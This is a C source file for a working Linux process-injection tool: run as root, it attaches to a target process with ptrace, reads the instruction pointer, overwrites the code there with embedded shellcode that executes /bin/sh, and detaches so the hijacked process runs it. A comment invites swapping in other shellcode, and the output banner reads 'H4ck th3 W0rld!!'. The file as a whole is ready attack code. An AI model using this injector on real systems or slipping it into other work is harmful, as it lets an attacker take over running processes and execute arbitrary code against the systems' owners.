#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/types.h>

#define RED "\e[0;31m"
#define GREEN "\e[0;32m"
#define RESET "\e[0m"

int process_injection(int pid) {
	unsigned char shellcode[] = { // MODIFY THE SHELLCODE HERE <<<<<
  		0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
  		0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48,
  		0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05
 	};
	size_t ShellLen = sizeof(shellcode);

	if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) { // attaching the process
		perror(RED "Error to attach" RESET);
		return 1;
	}
	printf("[+] Attaching Process...\n");

	int status;
	if(waitpid(pid, &status, 0) == -1) { // wait for the moment when the state will stop
		perror(RED "waitpid error" RESET);
		return 1;
	}
	printf(GREEN "[!] The process is paused!\n" RESET);
	
	printf(GREEN "[+] Getting RIP value...\n" RESET);
	struct user_regs_struct regs;
	if(ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) { // getting the registers and put into the "regs"
		perror(RED "getregs error" RESET);
		return 1;
	} 

	unsigned long address = regs.rip;
	printf(GREEN "[+] RIP = 0x%llx\n" RESET, (unsigned long long)address);
	printf(GREEN "[+] Turning shellcode into words...\n" RESET);

	size_t WordSize = sizeof(unsigned long);
	size_t nWords = (ShellLen + WordSize - 1) / WordSize;

	for(size_t i = 0; i < nWords; i++) {
		unsigned long word = 0;
		size_t base_offset = i * WordSize;

		// loop to write the word byte-to-byte
		for(size_t ii = 0; ii < WordSize; ii++) {
			size_t idx = base_offset + ii; // base (offset in byte) + current byte
			unsigned char byte = (idx < ShellLen) ? shellcode[idx] : 0x90;
			word |= ((unsigned long)byte) << (8 * ii); // make a OR operation and shift the bytes
		}

		printf(GREEN "[+] Writing shellcode in memory...\n" RESET);
		if(ptrace(PTRACE_POKETEXT, pid, (void*)(address + base_offset), (void*)word) == -1) { // Writing the shellcode words into the memory of target
			perror(RED "poketext error" RESET);
			return 1;
		}		
	}

	printf(GREEN "[+] Detaching the target...\n" RESET);
	if(ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
		perror(RED "Detach error" RESET);
		return 1;
	}

	printf(GREEN "[+] Shellcode injected in the target with sucess!\n[+] H4ck th3 W0rld!!\n" RESET);
}

int main(int argc, char **argv) {
	if(geteuid() != 0) { // if the euid not 0 (means the program is executed with root) end the program.
		printf(RED "[!] Execute with ROOT!\n" RESET);
		return 1;
	} 

	if(argc < 2) {
		fprintf(stderr, "[!] Usage: %s <target pid>\n", argv[0]);
		return 1; 
	}

	pid_t pid_id = (pid_t)atoi(argv[1]); // convert char of argv to int 
	
	if(pid_id <= 0) {
		fprintf(stderr, RED "[!] Invalid PID\n" RESET);
		return 1;
	}

	process_injection(pid_id);

}
